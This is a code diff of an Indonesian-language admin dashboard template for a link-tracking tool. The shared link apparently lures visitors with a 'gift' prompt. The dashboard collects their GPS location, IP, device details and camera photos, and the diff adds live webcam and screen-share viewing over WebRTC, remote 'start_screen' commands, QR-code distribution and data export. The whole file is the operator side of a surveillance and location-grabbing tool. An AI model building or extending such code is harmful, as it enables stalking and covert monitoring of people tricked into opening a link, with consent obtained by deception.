@@ -6,49 +6,24 @@
   <title>{{ app_name }} — Admin</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
-    :root{
-      --bg:#0b1020; --surface:#0f172a; --text:#e5e7eb;
-      --muted:#94a3b8; --card:rgba(255,255,255,.06);
-      --stroke:rgba(255,255,255,.12); --accent:#8b5cf6; --accent2:#22d3ee;
-      --danger:#ef4444;
-    }
+    :root{ --bg:#0b1020; --surface:#0f172a; --text:#e5e7eb; --muted:#94a3b8; --card:rgba(255,255,255,.06); --stroke:rgba(255,255,255,.12); --accent:#8b5cf6; --accent2:#22d3ee; --danger:#ef4444; }
     *{box-sizing:border-box}
-    body{
-      margin:0; min-height:100vh; color:var(--text);
-      font:14px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial;
-      background: radial-gradient(1200px 800px at 20% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%);
-    }
+    body{ margin:0; min-height:100vh; color:var(--text); font:14px/1.55 ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,Arial; background: radial-gradient(1200px 800px at 20% -10%, #1f2937 0%, #0b1020 40%, #0b1020 100%); }
     .container{max-width:1200px; margin:24px auto; padding:16px}
-    .header{
-      position: sticky; top:0; z-index:10;
-      background:linear-gradient(180deg, rgba(15,23,42,.85), rgba(15,23,42,.65));
-      backdrop-filter: blur(10px);
-      border:1px solid var(--stroke); border-radius:14px; padding:12px 14px; margin-bottom:14px;
-      display:flex; align-items:center; gap:12px; justify-content:space-between;
-    }
+    .header{ position: sticky; top:0; z-index:10; background:linear-gradient(180deg, rgba(15,23,42,.85), rgba(15,23,42,.65)); backdrop-filter: blur(10px); border:1px solid var(--stroke); border-radius:14px; padding:12px 14px; margin-bottom:14px; display:flex; align-items:center; gap:12px; justify-content:space-between; }
     .brand{display:flex; align-items:center; gap:10px}
     .brand .dot{width:10px; height:10px; border-radius:999px; background:linear-gradient(135deg,var(--accent),var(--accent2))}
     .brand h1{font-size:16px; margin:0}
     .actions{display:flex; gap:8px; flex-wrap:wrap}
-    .btn{
-      appearance:none; cursor:pointer; border-radius:10px; padding:9px 12px;
-      border:1px solid var(--stroke); background:var(--surface); color:var(--text);
-      transition:.2s transform ease;
-    }
+    .btn{ appearance:none; cursor:pointer; border-radius:10px; padding:9px 12px; border:1px solid var(--stroke); background:var(--surface); color:var(--text); transition:.2s transform ease; }
     .btn:hover{transform:translateY(-1px)}
     .btn.primary{background:linear-gradient(135deg,var(--accent),var(--accent2)); border-color:transparent}
     .btn.danger{border-color: rgba(239,68,68,.35); background:#1b1111; color:#fecaca}
     .btn.ghost{background:transparent}
-    .input{
-      width:260px; max-width:40vw; padding:10px 12px; border-radius:10px;
-      border:1px solid var(--stroke); background:#0b1324; color:var(--text);
-    }
+    .input{ width:260px; max-width:40vw; padding:10px 12px; border-radius:10px; border:1px solid var(--stroke); background:#0b1324; color:var(--text); }
     .grid{display:grid; gap:16px; grid-template-columns: 320px 1fr}
     @media (max-width: 960px){ .grid{grid-template-columns:1fr} }
-    .card{
-      background:var(--card); border:1px solid var(--stroke); border-radius:16px; padding:14px;
-      box-shadow:0 10px 30px rgba(0,0,0,.25);
-    }
+    .card{ background:var(--card); border:1px solid var(--stroke); border-radius:16px; padding:14px; box-shadow:0 10px 30px rgba(0,0,0,.25); }
     h3{margin:6px 0 10px; font-size:15px}
     .list{max-height:440px; overflow:auto; display:flex; flex-direction:column; gap:8px}
     .item{padding:10px; border:1px solid var(--stroke); border-radius:12px; background:#0e162b;}
@@ -56,30 +31,44 @@
     .item .title{display:flex; align-items:center; gap:8px; justify-content:space-between}
     .badge{font-size:12px; padding:3px 8px; border-radius:999px; border:1px solid var(--stroke); color:#cbd5e1}
     .muted{color:var(--muted)}
-    #map{height:520px; border-radius:14px; border:1px solid var(--stroke)}
-    @media (max-width: 600px){ #map{height:360px} }
-    table{width:100%; border-collapse:separate; border-spacing:0; border:1px solid var(--stroke); border-radius:12px; overflow:hidden; margin-top:12px}
-    thead th{
-      position:sticky; top:0; background:#0e162b; color:#c7d2fe; text-align:left;
-      font-weight:600; font-size:12px; letter-spacing:.02em; border-bottom:1px solid var(--stroke); padding:10px 8px
-    }
+    #map{ height:clamp(300px, 44vh, 520px); border-radius:14px; border:1px solid var(--stroke); overflow:hidden; isolation:isolate; }
+    .leaflet-pane .leaflet-tile { filter: hue-rotate(285deg) saturate(1.25) brightness(.95) contrast(1.05); transform: translateZ(0); }
+    .leaflet-overlay-pane svg path { stroke: #8b5cf6 !important; }
+    .leaflet-control-zoom a{ background:#0f172a; color:#fff; border:1px solid var(--stroke) }
+    .table-wrap{overflow-x:auto; -webkit-overflow-scrolling:touch; border-radius:12px}
+    table{min-width:1000px; width:100%; border-collapse:separate; border-spacing:0; border:1px solid var(--stroke); border-radius:12px; overflow:hidden; margin-top:12px}
+    thead th{ position:sticky; top:0; background:#0e162b; color:#c7d2fe; text-align:left; font-weight:600; font-size:12px; letter-spacing:.02em; border-bottom:1px solid var(--stroke); padding:10px 8px }
     tbody td{padding:10px 8px; border-bottom:1px solid rgba(255,255,255,.06)}
     tbody tr:nth-child(odd){background:rgba(255,255,255,.02)}
     tbody tr:hover{background:rgba(139,92,246,.10)}
-    code, .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+    .mono{font-family: ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
     .note{font-size:12px; color:var(--muted); margin-top:10px}
     .toolbar{display:flex; gap:8px; flex-wrap:wrap; margin:10px 0}
     .toast{position: fixed; bottom:14px; right:14px; padding:10px 12px; border-radius:12px; background:#0e162b; border:1px solid var(--stroke); display:none;}
-    .thumb{ width:64px; height:48px; object-fit:cover; border-radius:8px; border:1px solid rgba(255,255,255,.15) }
+    .thumb{ width:72px; height:54px; object-fit:cover; border-radius:8px; border:1px solid rgba(255,255,255,.15); cursor:pointer }
+    @media (max-width:560px){ .thumb{ width:60px; height:45px } }
+    .modal{ position: fixed; inset:0; background:rgba(0,0,0,.6); display:none; align-items:center; justify-content:center; z-index:50; backdrop-filter: blur(2px); }
+    .modal.open{display:flex}
+    .modal-card{ position:relative; width:min(94vw, 1000px); border-radius:14px; background:#0b1324; border:1px solid var(--stroke); padding:10px; box-shadow:0 20px 60px rgba(0,0,0,.55); }
+    .modal-img{width:100%; max-height:76vh; object-fit:contain; display:block; border-radius:10px}
+    .caption{margin-top:8px; font-size:12px; color:var(--muted)}
+    .nav{ position:absolute; inset:0; display:flex; align-items:center; justify-content:space-between; pointer-events:none; }
+    .nav button{ pointer-events:auto; background:rgba(0,0,0,.35); color:#fff; border:1px solid rgba(255,255,255,.2); width:42px; height:42px; border-radius:999px; cursor:pointer; }
+    .close-btn{ position:absolute; top:8px; right:8px; background:#1f2937; color:#fff; border:1px solid rgba(255,255,255,.2); width:36px; height:36px; border-radius:999px; cursor:pointer; }
+    .sessions{ display:grid; grid-template-columns: 1fr; gap:8px; margin-top:12px }
+    .sess-card{ display:grid; grid-template-columns: 150px 1fr 1fr auto; gap:8px; padding:10px; border:1px solid var(--stroke); border-radius:12px; background:#0e162b; align-items:center }
+    .badge.online{ border:1px solid rgba(16,185,129,.4); color:#a7f3d0; }
+    .badge.offline{ border:1px solid rgba(239,68,68,.4); color:#fecaca; }
+    .livewrap{ margin-top:12px; display:grid; grid-template-columns: 1fr; gap:12px }
+    video{ width:100%; max-height:60vh; background:#0b1324; border:1px solid var(--stroke); border-radius:12px }
+    .group{ display:grid; gap:6px }
+    .row{ display:flex; gap:8px; flex-wrap:wrap; align-items:center }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <div class="brand">
-        <div class="dot"></div>
-        <h1>Admin Monitor</h1>
-      </div>
+      <div class="brand"><div class="dot"></div><h1>Selamat datang admin dava </h1></div>
       <form class="actions" method="post" action="/admin">
         <input class="input" type="text" name="slug" placeholder="Slug opsional (mis: promo-ig)" />
         <button class="btn primary" type="submit">Buat Link</button>
@@ -91,25 +80,25 @@
       <div class="card">
         <h3>Channel</h3>
         <div class="list">
-          {% for token, data in channels.items() %}
-            <div class="item {% if focus==token %}focus{% endif %}">
-              <div class="title">
-                <div><strong>{{ token }}</strong></div>
-                <span class="badge">{{ (data.hits|length) if data.hits else 0 }} hits</span>
+          {% if channels %}
+            {% for token, data in channels.items() %}
+              <div class="item {% if focus==token %}focus{% endif %}">
+                <div class="title">
+                  <div><strong>{{ token }}</strong></div>
+                  <span class="badge">{{ (data.hits|length) if data.hits else 0 }} hits</span>
+                </div>
+                <div class="muted" style="margin-top:4px">dibuat {{ data.created_at }}</div>
+                <div class="muted" style="margin-top:6px">Share: <a href="{{ base }}/t/{{ token }}" target="_blank">{{ base }}/t/{{ token }}</a></div>
+                <div class="muted">Admin: <a href="{{ base }}/admin/{{ token }}">{{ base }}/admin/{{ token }}</a></div>
+                <div style="display:flex; gap:8px; margin-top:8px">
+                  <button class="btn" data-copy="{{ base }}/t/{{ token }}">Copy link</button>
+                  <a class="btn ghost" href="{{ base }}/admin/{{ token }}">Buka</a>
+                </div>
               </div>
-              <div class="muted" style="margin-top:4px">dibuat {{ data.created_at }}</div>
-              <div class="muted" style="margin-top:6px">
-                Share: <a href="{{ base }}/t/{{ token }}" target="_blank">{{ base }}/t/{{ token }}</a>
-              </div>
-              <div class="muted">Admin: <a href="{{ base }}/admin/{{ token }}">{{ base }}/admin/{{ token }}</a></div>
-              <div style="display:flex; gap:8px; margin-top:8px">
-                <button class="btn" data-copy="{{ base }}/t/{{ token }}">Copy link</button>
-                <a class="btn ghost" href="{{ base }}/admin/{{ token }}">Buka</a>
-              </div>
-            </div>
+            {% endfor %}
           {% else %}
             <div class="note">Belum ada channel. Buat dulu di atas.</div>
-          {% endfor %}
+          {% endif %}
         </div>
       </div>
 
@@ -118,36 +107,88 @@
           <div style="display:flex; align-items:center; justify-content:space-between; gap:10px">
             <h3 style="margin:0">Live Map — <code class="mono">{{ focus }}</code></h3>
             <div class="toolbar">
+              <button id="photosBtn" class="btn">Photos</button>
               <button id="fitBtn" class="btn">Fit markers</button>
               <button id="pauseBtn" class="btn">Pause</button>
+              <button id="qrBtn" class="btn">QR Code</button>
+              <button id="exportCsvBtn" class="btn">Export CSV</button>
+              <button id="exportJsonBtn" class="btn">Export JSON</button>
               <button id="clearBtn" class="btn danger">Clear Data</button>
             </div>
           </div>
 
           <div id="map"></div>
 
-          <table id="tbl">
-            <thead>
-              <tr>
-                <th>Waktu (UTC)</th>
-                <th>Sumber</th>
-                <th>Lat</th>
-                <th>Lon</th>
-                <th>± (m)</th>
-                <th>IP (label)</th>
-                <th>UA</th>
-                <th>Foto</th>
-              </tr>
-            </thead>
-            <tbody></tbody>
-          </table>
+          <h3 style="margin:10px 0 6px">Live Sessions</h3>
+          <div id="sessions" class="sessions"></div>
 
-          <p class="note">
-            Privasi: lokasi/kamera hanya aktif jika user menekan “Buka Hadiah” dan memberi izin.
-          </p>
+          <div class="livewrap">
+            <div class="group">
+              <h3 style="margin:10px 0 6px">Camera Live</h3>
+              <video id="liveVideo" playsinline autoplay controls></video>
+              <div class="row">
+                <button id="stopWatchBtn" class="btn danger">Stop Cam</button>
+                <span class="note">Klik “Watch Cam” pada kartu sesi untuk mulai.</span>
+              </div>
+            </div>
+
+            <div class="group">
+              <h3 style="margin:10px 0 6px">Screen Live</h3>
+              <video id="screenVideo" playsinline autoplay controls></video>
+              <div class="row">
+                <button id="stopScreenBtn" class="btn danger">Stop Screen</button>
+                <span class="note">Klik “Watch Screen” pada kartu sesi (user harus menyetujui share layar).</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="table-wrap">
+            <table id="tbl">
+              <thead>
+                <tr>
+                  <th>Waktu (UTC)</th>
+                  <th>Sumber</th>
+                  <th>Lat</th>
+                  <th>Lon</th>
+                  <th>± (m)</th>
+                  <th>IP (label)</th>
+                  <th>UA</th>
+                  <th>Foto</th>
+                  <th>Alamat</th>
+                </tr>
+              </thead>
+              <tbody></tbody>
+            </table>
+          </div>
+
+          <p class="note">Privasi: data/stream hanya terkirim saat pengguna membuka link dan memberi izin.</p>
         {% else %}
           <p class="note">Pilih salah satu channel di kiri untuk melihat peta & data.</p>
         {% endif %}
+      </div>
+    </div>
+  </div>
+
+  <!-- Photo Modal -->
+  <div id="photoModal" class="modal" aria-hidden="true">
+    <div class="modal-card">
+      <button id="closeModal" class="close-btn" title="Tutup">✕</button>
+      <img id="modalImg" class="modal-img" alt="photo">
+      <div class="caption" id="modalCap"></div>
+      <div class="nav">
+        <div style="padding-left:6px"><button id="prevPhoto" title="Sebelumnya">‹</button></div>
+        <div style="padding-right:6px"><button id="nextPhoto" title="Berikutnya">›</button></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- QR Modal -->
+  <div id="qrModal" class="modal" aria-hidden="true">
+    <div class="modal-card" style="max-width:420px">
+      <button id="closeQr" class="close-btn" title="Tutup">✕</button>
+      <div style="display:grid;place-items:center;padding:12px">
+        <canvas id="qrCanvas"></canvas>
+        <div class="caption mono" id="qrLink"></div>
       </div>
     </div>
   </div>
@@ -156,45 +197,79 @@
 
   {% if focus %}
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.5/build/qrcode.min.js"></script>
   <script>
-    // UI helpers
     const toast = (msg)=>{ const t=document.getElementById('toast'); t.textContent=msg; t.style.display='block'; setTimeout(()=>t.style.display='none',1600); };
     document.querySelectorAll('[data-copy]').forEach(b=>{
-      b.addEventListener('click', async ()=>{
-        try{ await navigator.clipboard.writeText(b.dataset.copy); toast('Tersalin'); }catch{ toast('Gagal menyalin'); }
-      });
+      b.addEventListener('click', async ()=>{ try{ await navigator.clipboard.writeText(b.dataset.copy); toast('Tersalin'); }catch{ toast('Gagal menyalin'); } });
     });
 
-    // Map & polling
-    const token = {{ focus|tojson }};
+    const token = {{ (focus|default(None))|tojson }};
     const map = L.map('map',{zoomControl:true}).setView([0,0], 2);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{ attribution:'&copy; OpenStreetMap' }).addTo(map);
+    window.addEventListener('resize', ()=>{ map.invalidateSize(); });
 
     const tbody = document.querySelector('#tbl tbody');
-    let lastTs = null, paused = false;
-    let markers = {};
-    let bounds = L.latLngBounds([]);
+    const sessWrap = document.getElementById('sessions');
+    const liveVideo = document.getElementById('liveVideo');
+    const screenVideo = document.getElementById('screenVideo');
 
+    let lastTs = null, paused = false;
+    let bounds = L.latLngBounds([]);
+    let markers = {};
+    let photoHits = [];
+    let currentPhotoIdx = -1;
+
+    function ping(){ try{ const ctx=new (window.AudioContext||window.webkitAudioContext)(); const o=ctx.createOscillator(),g=ctx.createGain(); o.type='sine';o.frequency.value=880;o.connect(g);g.connect(ctx.destination);g.gain.setValueAtTime(0.0001,ctx.currentTime);g.gain.exponentialRampToValueAtTime(0.2,ctx.currentTime+0.01);g.gain.exponentialRampToValueAtTime(0.0001,ctx.currentTime+0.25);o.start();o.stop(ctx.currentTime+0.26);}catch(e){}}
+    const style = document.createElement('style'); style.textContent='@keyframes blink{0%{background:rgba(34,211,238,.15)}100%{}}'; document.head.appendChild(style);
+    function timeAgo(ts){ if(!ts) return '-'; const d = new Date(ts).getTime(); const s = Math.max(0, (Date.now()-d)/1000|0); if (s<60) return s+'s ago'; const m=s/60|0; if(m<60) return m+'m ago'; const h=m/60|0; return h+'h ago'; }
+
+    // Photo modal
+    function openModal(idx){
+      if (idx < 0 || idx >= photoHits.length) return;
+      currentPhotoIdx = idx;
+      const h = photoHits[idx];
+      document.getElementById('modalImg').src = h.photo_url;
+      document.getElementById('modalCap').textContent =
+        `${h.ts} • ${h.coords.source||'-'} • lat=${h.coords.lat!=null?h.coords.lat.toFixed(6):'-'}, lon=${h.coords.lon!=null?h.coords.lon.toFixed(6):'-'} • ±${h.coords.acc??'-'}m • ${h.ip}${h.ip_label?' ('+h.ip_label+')':''}`;
+      document.getElementById('photoModal').classList.add('open');
+    }
+    function closeModal(){ currentPhotoIdx = -1; document.getElementById('photoModal').classList.remove('open'); }
+    function nextPhoto(step=1){ if (!photoHits.length) return; openModal((currentPhotoIdx + step + photoHits.length) % photoHits.length); }
+
+    // Table + markers
     function addRow(hit){
       const tr = document.createElement('tr');
       const lat = hit.coords.lat, lon = hit.coords.lon, acc = hit.coords.acc ?? '-';
       const src = hit.coords.source || '-';
       const ipLabel = hit.ip + (hit.ip_label ? ` (${hit.ip_label})` : '');
-      const foto = hit.photo_url ? `<a href="${hit.photo_url}" target="_blank"><img class="thumb" src="${hit.photo_url}" alt="photo"></a>` : '-';
+      const place = hit.place || '-';
+      let fotoCell = '-';
+      if (hit.photo_url){
+        const idx = photoHits.push(hit) - 1;
+        fotoCell = `<img class="thumb photo-open" data-idx="${idx}" src="${hit.photo_url}" alt="photo" loading="lazy">`;
+      }
+      const latText = lat!=null ? lat.toFixed(6) : '-';
+      const lonText = lon!=null ? lon.toFixed(6) : '-';
+      const maps = (lat!=null && lon!=null) ? `https://maps.google.com/?q=${lat},${lon}` : null;
+      const latCell = maps ? `<a href="${maps}" target="_blank" rel="noopener">${latText}</a>` : '-';
+      const lonCell = maps ? `<a href="${maps}" target="_blank" rel="noopener">${lonText}</a>` : '-';
+
       tr.innerHTML = `
         <td class="mono">${hit.ts}</td>
-        <td>${src}</td>
-        <td class="mono">${lat!=null ? lat.toFixed(6) : '-'}</td>
-        <td class="mono">${lon!=null ? lon.toFixed(6) : '-'}</td>
+        <td>${src}${hit.kind==='photo'?' • photo':''}</td>
+        <td class="mono">${latCell}</td>
+        <td class="mono">${lonCell}</td>
         <td class="mono">${acc}</td>
         <td class="mono" title="${ipLabel}">${ipLabel}</td>
         <td title="${hit.ua||''}">${(hit.ua||'').slice(0,80)}</td>
-        <td>${foto}</td>
+        <td>${fotoCell}</td>
+        <td title="${place}">${place.slice(0,80)}</td>
       `;
-      tbody.prepend(tr);
+      tbody.prepend(tr); tr.style.animation = 'blink .9s ease';
     }
-
     function addPoint(hit){
+      if (hit.kind === 'photo') return;
       const lat = hit.coords.lat, lon = hit.coords.lon;
       if (lat==null || lon==null) return;
       const acc = Math.max(0, hit.coords.acc || 0);
@@ -203,7 +278,6 @@
       markers[hit.id] = {marker:m, circle:c};
       bounds.extend([lat,lon]);
     }
-
     async function fetchUpdates(){
       if (paused) return;
       const url = lastTs ? `/api/locations/${token}?since=${encodeURIComponent(lastTs)}` : `/api/locations/${token}`;
@@ -218,14 +292,175 @@
           if (bounds.isValid()) map.fitBounds(bounds.pad(0.25));
         } else if (hits.length){
           hits.forEach(h=>{ addRow(h); addPoint(h); });
+          ping();
         }
         if (hits.length){ lastTs = hits[hits.length-1].ts; }
       }catch(e){}
     }
 
-    setInterval(fetchUpdates, 2500);
-    fetchUpdates();
+    // Sessions
+    function renderSessions(list){
+      sessWrap.innerHTML = '';
+      list.sort((a,b)=>{
+        const ao = (a.status==='online')?0:1, bo = (b.status==='online')?0:1;
+        if (ao!==bo) return ao-bo;
+        return (b.last_seen||'').localeCompare(a.last_seen||'');
+      });
+      list.forEach(s=>{
+        const online = s.status==='online' && s.last_seen && (Date.now() - new Date(s.last_seen).getTime() < 8000);
+        const status = online ? 'online' : 'offline';
+        const conn = s.conn && s.conn.eff ? s.conn.eff : (s.conn||'-');
+        const bat = s.battery && (typeof s.battery.level==='number')
+          ? `${Math.round(s.battery.level*100)}%${s.battery.charging?'⚡':''}` : '-';
+        const scr = s.screen ? `${s.screen.w}×${s.screen.h}@${s.screen.dpr||1}` : '-';
+        const ua = (s.ua||'').slice(0,80);
+        const el = document.createElement('div');
+        el.className='sess-card';
+        el.innerHTML = `
+          <div class="mono"><div><strong>${(s.session_id||'').slice(0,8)}</strong></div>
+            <div><span class="badge ${status}">${status}</span></div>
+            <div class="muted">${(s.last_seen||'-')}</div>
+          </div>
+          <div>
+            <div>IP: <span class="mono">${s.ip||'-'}</span></div>
+            <div>Conn: ${conn} • Bat: ${bat}</div>
+            <div>Layar: ${scr}</div>
+          </div>
+          <div class="muted" title="${s.ua||''}">
+            ${ua}
+            <div>${s.platform||''} ${s.vendor?('• '+s.vendor):''} • ${s.lang||''} • ${s.tz||''}</div>
+          </div>
+          <div style="display:flex; gap:8px; justify-content:flex-end">
+            <button class="btn primary watch-cam-btn" data-sid="${s.session_id}">Watch Cam</button>
+            <button class="btn watch-screen-btn" data-sid="${s.session_id}">Watch Screen</button>
+          </div>
+        `;
+        sessWrap.appendChild(el);
+      });
+      if (!list.length){
+        sessWrap.innerHTML = '<div class="note">Belum ada sesi aktif.</div>';
+      }
+    }
+    async function fetchSessions(){
+      try{
+        const r = await fetch(`/api/sessions/${token}`);
+        const j = await r.json();
+        if (j && j.ok) renderSessions(j.sessions||[]);
+      }catch(e){}
+    }
 
+    // WebRTC viewer (Admin)
+    let pc = null, pollTimer = null, viewerId = null, targetSid = null;
+    function randId(){ return (crypto.randomUUID?crypto.randomUUID():Math.random().toString(36).slice(2)) + '-' + Date.now().toString(36); }
+
+    async function sendSignal(mailbox, msg){
+      try{
+        await fetch(`/api/signal/send/${token}/${encodeURIComponent(mailbox)}`, {
+          method:'POST', headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ msg })
+        });
+      }catch(e){}
+    }
+    async function pollSignal(mailbox, handler){
+      try{
+        const r = await fetch(`/api/signal/poll/${token}/${encodeURIComponent(mailbox)}`);
+        const j = await r.json();
+        if (j && j.ok && Array.isArray(j.msgs)){ j.msgs.forEach(handler); }
+      }catch(e){}
+    }
+
+    async function startWatch(sid){
+      stopWatch();
+      targetSid = sid;
+      viewerId = randId();
+
+      pc = new RTCPeerConnection({
+        iceServers: [{ urls: ['stun:stun.l.google.com:19302', 'stun:global.stun.twilio.com:3478'] }]
+      });
+
+      pc.ontrack = (ev)=>{
+        const stream = ev.streams && ev.streams[0];
+        const s = ev.track.getSettings ? ev.track.getSettings() : {};
+        const label = (ev.track.label || '').toLowerCase();
+        const isDisplay = !!(s.displaySurface) || label.includes('screen') || label.includes('window') || label.includes('tab');
+        if (isDisplay) {
+          if (screenVideo.srcObject !== stream) screenVideo.srcObject = stream;
+        } else {
+          if (liveVideo.srcObject !== stream) liveVideo.srcObject = stream;
+        }
+      };
+
+      pc.onicecandidate = (ev)=>{
+        if (ev.candidate){
+          sendSignal(`client_${sid}`, { type:'candidate', viewerId, candidate: ev.candidate });
+        }
+      };
+
+      const offer = await pc.createOffer({ offerToReceiveVideo: true, offerToReceiveAudio: false });
+      await pc.setLocalDescription(offer);
+      await sendSignal(`client_${sid}`, { type:'offer', viewerId, sdp: pc.localDescription });
+
+      pollTimer = setInterval(async ()=>{
+        await pollSignal(`admin_${sid}`, async (m)=>{
+          if (m.viewerId && m.viewerId !== viewerId) return;
+          if (m.type === 'answer' && m.sdp){
+            if (!pc.currentRemoteDescription) await pc.setRemoteDescription(new RTCSessionDescription(m.sdp));
+          } else if (m.type === 'candidate' && m.candidate){
+            try{ await pc.addIceCandidate(new RTCIceCandidate(m.candidate)); }catch(e){}
+          } else if (m.type === 'screen_ready'){
+            const off2 = await pc.createOffer();
+            await pc.setLocalDescription(off2);
+            await sendSignal(`client_${sid}`, { type:'offer', viewerId, sdp: pc.localDescription });
+            toast('Screen share siap.');
+          } else if (m.type === 'screen_stopped'){
+            screenVideo.srcObject = null;
+            toast('Screen share berhenti.');
+          }
+        });
+      }, 800);
+
+      toast('Meminta stream…');
+    }
+
+    async function requestScreen(sid){
+      if (!pc || targetSid !== sid) {
+        await startWatch(sid);
+        setTimeout(()=> sendSignal(`client_${sid}`, { type:'cmd', viewerId, cmd:'start_screen' }), 600);
+      } else {
+        await sendSignal(`client_${sid}`, { type:'cmd', viewerId, cmd:'start_screen' });
+      }
+      toast('Meminta share layar…');
+    }
+
+    async function stopScreen(){
+      if (!targetSid || !viewerId) return;
+      await sendSignal(`client_${targetSid}`, { type:'cmd', viewerId, cmd:'stop_screen' });
+    }
+
+    function stopWatch(){
+      if (pollTimer){ clearInterval(pollTimer); pollTimer = null; }
+      if (pc){ try{ pc.close(); }catch(e){} pc = null; }
+      viewerId = null; targetSid = null;
+      liveVideo.srcObject = null;
+      screenVideo.srcObject = null;
+    }
+
+    // Bind buttons
+    document.getElementById('stopWatchBtn').onclick = stopWatch;
+    document.getElementById('stopScreenBtn').onclick = stopScreen;
+    sessWrap.addEventListener('click', async (e)=>{
+      const bCam = e.target.closest('.watch-cam-btn');
+      const bScr = e.target.closest('.watch-screen-btn');
+      if (bCam) { await startWatch(bCam.dataset.sid); }
+      if (bScr) { await requestScreen(bScr.dataset.sid); }
+    });
+
+    // Loops
+    setInterval(fetchUpdates, 2000);
+    setInterval(fetchSessions, 3000);
+    fetchUpdates(); fetchSessions();
+
+    // toolbar
     document.getElementById('fitBtn').onclick = ()=>{ if (bounds.isValid()) map.fitBounds(bounds.pad(0.25)); };
     document.getElementById('pauseBtn').onclick = (e)=>{ paused = !paused; e.target.textContent = paused ? 'Resume' : 'Pause'; };
     document.getElementById('clearBtn').onclick = async ()=>{
@@ -233,8 +468,42 @@
       tbody.innerHTML = '';
       Object.values(markers).forEach(({marker,circle})=>{ map.removeLayer(marker); map.removeLayer(circle); });
       markers = {}; bounds = L.latLngBounds([]); lastTs = null;
+      photoHits = []; closeModal();
       toast('Data dibersihkan');
     };
+    document.getElementById('photosBtn').onclick = ()=>{ if (photoHits.length) openModal(photoHits.length-1); else toast('Belum ada foto'); };
+
+    // Export & QR
+    document.getElementById('exportCsvBtn').onclick = ()=>{ location.href = `/api/export/${token}.csv`; };
+    document.getElementById('exportJsonBtn').onclick = ()=>{ location.href = `/api/export/${token}.json`; };
+    const shareLink = `${location.origin}/t/${token}`;
+    const qrModal = document.getElementById('qrModal');
+    document.getElementById('qrBtn').onclick = ()=>{
+      const canvas = document.getElementById('qrCanvas');
+      QRCode.toCanvas(canvas, shareLink, { width: 260 }, ()=>{});
+      document.getElementById('qrLink').textContent = shareLink;
+      qrModal.classList.add('open');
+    };
+    document.getElementById('closeQr').onclick = ()=> qrModal.classList.remove('open');
+    qrModal.addEventListener('click', (e)=>{ if (e.target.id === 'qrModal') qrModal.classList.remove('open'); });
+
+    // modal & thumbnail delegation
+    tbody.addEventListener('click', (e)=>{
+      const img = e.target.closest('.photo-open');
+      if (!img) return;
+      const idx = Number(img.dataset.idx || -1);
+      if (idx >= 0) openModal(idx);
+    });
+    document.getElementById('closeModal').onclick = closeModal;
+    document.getElementById('prevPhoto').onclick = ()=>nextPhoto(-1);
+    document.getElementById('nextPhoto').onclick = ()=>nextPhoto(1);
+    document.getElementById('photoModal').addEventListener('click', (e)=>{ if (e.target.id === 'photoModal') closeModal(); });
+    window.addEventListener('keydown', (e)=>{
+      if (!document.getElementById('photoModal').classList.contains('open')) return;
+      if (e.key === 'Escape') closeModal();
+      if (e.key === 'ArrowLeft') nextPhoto(-1);
+      if (e.key === 'ArrowRight') nextPhoto(1);
+    });
   </script>
   {% endif %}
 </body>
